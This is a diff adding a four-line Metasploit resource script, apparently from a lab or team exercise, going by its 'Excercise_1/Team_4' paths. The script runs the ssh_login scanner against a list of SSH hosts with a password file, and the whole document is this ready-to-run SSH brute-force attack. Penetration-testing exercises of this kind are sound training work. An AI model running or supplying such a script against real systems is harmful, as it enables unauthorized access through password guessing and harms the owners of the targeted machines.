@@ -1,0 +1,4 @@
+use auxiliary/scanner/ssh/ssh_login
+set RHOSTS /root/Desktop/Excercise_1/Team_4/sshBoxes
+set PASS_FILE /root/Desktop/Excercise_1/passwords
+exploit -j
